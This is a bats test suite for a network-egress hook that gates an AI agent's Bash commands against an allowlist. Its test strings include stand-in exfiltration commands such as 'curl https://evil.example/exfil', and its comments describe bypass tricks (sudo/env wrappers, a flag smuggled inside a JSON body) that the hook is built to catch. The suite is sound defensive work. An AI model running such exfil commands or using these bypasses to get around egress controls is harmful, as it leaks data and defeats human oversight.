#!/usr/bin/env bats
# tests/hooks/network-gate.bats
#
# OSS Trust A-2 — AC-2 coverage. `hooks/network-gate.sh` PreToolUse hook.
# Spec: docs/specs/network-egress-allowlist.md
# Parent: #122 OSS Trust epic
#
# Threat model: shell commands the agent issues can reach arbitrary hosts
# unless this hook blocks them. Composes with bash-denylist + approval-gate
# in the PreToolUse Bash chain (D-8 — all hooks must allow).
#
# I/O contract (Claude Code hook spec):
#   stdin:  JSON {"tool_name":"<name>","tool_input":{"command":"..."}}
#   stdout: JSON {"decision":"allow"|"block","reason":"..."}

setup() {
  REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
  HOOK="$REPO_ROOT/hooks/network-gate.sh"
  [[ -f "$HOOK" ]] || skip "network-gate.sh not present"

  TMP_HOME="$(mktemp -d)"
  TMP_CFG="$TMP_HOME/.config/walter-os"
  mkdir -p "$TMP_CFG"
  export HOME="$TMP_HOME"
  export WALTER_CONFIG="$TMP_CFG"
  export WALTER_OS_HOME="$REPO_ROOT"
  ALLOWLIST="$TMP_CFG/egress-allowlist.txt"
  # Clear bypass env between tests.
  unset WALTER_EGRESS_ALLOW_OVERRIDE || true
}

teardown() {
  cd "$BATS_TEST_DIRNAME"
  case "$TMP_HOME" in
    /tmp/*|/var/folders/*|/var/tmp/*) rm -rf "$TMP_HOME" ;;
  esac
  true
}

# Helper: feed a PreToolUse JSON for a Bash command into the hook.
_call_hook_bash() {
  local cmd="$1"
  printf '{"tool_name":"Bash","tool_input":{"command":%s}}' \
    "$(printf '%s' "$cmd" | jq -Rs .)" \
    | bash "$HOOK"
}

# Helper: feed a non-Bash tool event (should always pass through).
_call_hook_other() {
  local tool="$1"
  printf '{"tool_name":"%s","tool_input":{}}' "$tool" | bash "$HOOK"
}

# ---------------------------------------------------------------------------
# Passthrough cases (no decision needed)
# ---------------------------------------------------------------------------

@test "AC-2: non-Bash tool calls pass through (allow)" {
  run _call_hook_other Read
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: Bash command with no network call passes through (allow)" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "ls -la /tmp"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: shell builtin / pipeline without a network CLI is allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'echo hello | grep h | wc -l'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# curl + wget — extract host from URL
# ---------------------------------------------------------------------------

@test "AC-2: curl https://api.github.com (in allowlist) → allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://api.github.com/repos/foo/bar'
  echo "$output"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: curl https://evil.example (empty allowlist) → block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'evil\.example|not in egress allowlist'
}

@test "AC-2: curl with flags before URL still extracts host" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl -X POST -H "Accept: application/json" https://api.github.com/issues'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: wget http://pypi.org → host extracted + checked" {
  echo 'pypi.org' > "$ALLOWLIST"
  run _call_hook_bash 'wget http://pypi.org/simple/foo'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: curl with no URL anywhere → fail-CLOSED (block)" {
  # This is an operator typo (`curl` alone). Fail-closed per spec.
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl --help'
  [ "$status" -eq 0 ]
  # Either block ("can't extract host") OR allow (--help is harmless).
  # Spec AC-2 says fail-CLOSED on missing host for known network CLIs,
  # so we expect block. Operators who hit this run `curl --help` outside
  # the hook (it's a local-only command).
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Wildcard semantics inherited from the loader
# ---------------------------------------------------------------------------

@test "AC-2: wildcard subdomain match is honoured" {
  echo '*.openrouter.ai' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://api.openrouter.ai/v1/chat'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: wildcard does NOT match apex (spec D-5)" {
  echo '*.openrouter.ai' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://openrouter.ai/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# git — both https and ssh-style URLs
# ---------------------------------------------------------------------------

@test "AC-2: git clone https://github.com/... (allowlisted) → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git clone https://github.com/foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: git clone git@github.com:foo/bar (ssh-form) → host extracted" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git clone git@github.com:foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: git push to a non-allowlisted remote → block" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git push https://gitlab.example/foo/bar HEAD:main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: local-only git subcommands (status, log, diff, cherry, branch) pass through" {
  # `git status` / `git log` / `git diff` / `git cherry` / `git branch`
  # are local-only. `git cherry` (R2 fix B4) was previously misclassified
  # as a network subcommand and blocked when invoked with no URL — pin
  # it as local here.
  echo 'github.com' > "$ALLOWLIST"
  for cmd in 'git status' 'git log --oneline -5' 'git diff' 'git cherry main' 'git branch -a'; do
    run _call_hook_bash "$cmd"
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.decision == "allow"' || { echo "expected allow for: $cmd → $output"; return 1; }
  done
}

@test "AC-2 (R2): 'git fetch' with no explicit URL → fail-CLOSED block" {
  # Behavior the previous test NAMED but never asserted. `git fetch`
  # with no remote uses the configured upstream — implicit host that
  # the parser can't see. Per spec AC-2, fail-CLOSED.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git fetch'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'implicit remote|git fetch'
}

@test "AC-2 (R2 B5): 'git lfs push origin' with no URL → fail-CLOSED block" {
  # Without B5, `git lfs push origin main` falls to the catch-all ALLOW
  # branch and bypasses the gate completely. With B5, `lfs` is in the
  # network subcommand list and fails CLOSED on missing URL.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git lfs push origin main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B5): 'git svn fetch' / 'git annex get' fail-CLOSED" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git svn fetch'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  run _call_hook_bash 'git annex get bigfile.bin'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B5): 'git lfs push https://github.com/foo/bar' (allowlisted) → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git lfs push https://github.com/foo/bar.git main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# R2 B1: sudo / env / nice / nohup wrappers must NOT bypass the gate
# ---------------------------------------------------------------------------

@test "AC-2 (R2 B1): 'sudo curl https://evil.example' is blocked" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): 'sudo -E curl https://evil.example' is blocked" {
  # Without the fix, `-E` was treated as the CLI name → fell to ALLOW.
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -E curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): 'sudo -u nobody curl https://evil.example' is blocked" {
  # `-u nobody` is a flag+value pair; the unwrapper must consume both.
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -u nobody curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): 'env FOO=bar curl https://evil.example' is blocked" {
  # env-style VAR=VAL assignments before the real CLI must also be
  # stripped so the parser sees `curl`.
  : > "$ALLOWLIST"
  run _call_hook_bash 'env FOO=bar curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): '/usr/bin/env curl https://api.github.com' with allowlist works" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash '/usr/bin/env curl https://api.github.com/repos/foo/bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (R2 B1): 'sudo -E' with NO followed CLI → fail-CLOSED" {
  # Pathological: sudo + flag and then EOL. Resulting cli is empty.
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -E'
  [ "$status" -eq 0 ]
  # Empty cli → falls into the unable-to-identify branch (block).
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# R2 W1: IPv6 literal URL host extraction
# ---------------------------------------------------------------------------

@test "AC-2 (R2 W1): IPv6 literal URL extracts bracketed host (allowlisted)" {
  echo '[::1]' > "$ALLOWLIST"
  run _call_hook_bash 'curl http://[::1]:8080/api'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (R2 W1): IPv6 literal URL extracts bracketed host (NOT in allowlist)" {
  # Without W1 fix, [ was returned as the "host", failing CLI validation
  # with a cryptic error. With the fix, the bracketed literal is treated
  # as the host and a clean block message comes back.
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl http://[fd00::1]/api'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'fd00::1'
}

# ---------------------------------------------------------------------------
# R2 B7: bypass flag in command DATA (JSON body) must NOT trigger bypass
# ---------------------------------------------------------------------------

@test "AC-2 (R2 B7): bypass flag inside a JSON body does NOT trigger bypass" {
  # The flag must be SPACE-BRACKETED to count as a real CLI token.
  # In `curl -d '{"x":"--allow-egress-outbound"}' https://evil.example`,
  # the flag is bracketed by `"` not whitespace, so the regex
  # `(^|[[:space:]])--allow-egress-outbound([[:space:]]|$)` does NOT
  # match → bypass does NOT fire → curl-to-evil is BLOCKED.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl -d "{\"flag\":\"--allow-egress-outbound\"}" https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"' || { echo "expected block (flag in JSON body), got: $output"; return 1; }
}

@test "AC-2 (R2 B7): bypass flag as real CLI token DOES trigger bypass" {
  # The legitimate operator-typed form: `... --allow-egress-outbound`
  # with whitespace boundary → the bypass DOES fire.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# gh — implicit github.com / GH_HOST
# ---------------------------------------------------------------------------

@test "AC-2: gh pr create with github.com allowlisted → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'gh pr create --title "[FEAT] -TECHNICAL- foo" --body bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: gh pr create with github.com NOT allowlisted → block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'gh pr create --title x --body y'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# ssh / scp — extract user@host
# ---------------------------------------------------------------------------

@test "AC-2: ssh user@host with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh nico@walter-vm.tail.example ls /tmp'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: ssh host (no user) with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh walter-vm.tail.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: scp file user@host:/path with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'scp ./file.txt nico@walter-vm.tail.example:/tmp/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# pip / npm / uvx / cargo — implicit-host fail-CLOSED
# ---------------------------------------------------------------------------

@test "AC-2: pip install foo (implicit registry) → fail-CLOSED block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'pip install requests'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'implicit host|index-url|registry'
}

@test "AC-2: npm install foo (implicit registry) → fail-CLOSED block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'npm install lodash'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Two-factor bypass (WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound)
# ---------------------------------------------------------------------------

@test "AC-2: two-factor bypass allows AND emits a systemMessage WARN" {
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
  echo "$output" | jq -er '.systemMessage // empty' | grep -qE 'network-gate|bypass|emergency.example'
}

@test "AC-2: env var alone does NOT bypass" {
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: flag alone does NOT bypass" {
  : > "$ALLOWLIST"
  unset WALTER_EGRESS_ALLOW_OVERRIDE
  run _call_hook_bash 'curl https://evil.example --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Robustness / fail-CLOSED
# ---------------------------------------------------------------------------

@test "AC-2: empty stdin → fail-CLOSED block" {
  run bash -c "printf '' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: malformed JSON → fail-CLOSED block" {
  run bash -c "printf '{not json' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: Bash event without command field → fail-CLOSED block" {
  run bash -c "printf '{\"tool_name\":\"Bash\",\"tool_input\":{}}' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}
